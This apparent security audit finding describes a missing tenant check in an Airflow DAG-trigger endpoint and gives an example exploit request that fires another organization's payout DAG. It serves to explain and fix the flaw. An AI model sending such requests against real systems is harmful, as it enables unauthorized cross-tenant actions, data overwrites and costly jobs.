diagnosis: The Airflow orchestration endpoint wraps the Airflow trigger_dag client. It takes dag_id and execution parameters directly from the user payload. Because it fails to check whether dag_id is allocated to current_user.tenant_id, an authenticated user can trigger sensitive ETL, data export, or maintenance DAGs belonging to other organizations or internal operations, potentially overwriting target databases or initiating expensive cloud tasks.
exploit_request:
POST /orchestration/airflow/trigger HTTP/1.1
Host: airflow-api.enterprise.net
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"dag_id": "tenant_competitor_nightly_payout_sync", "conf": {"dry_run": false}}
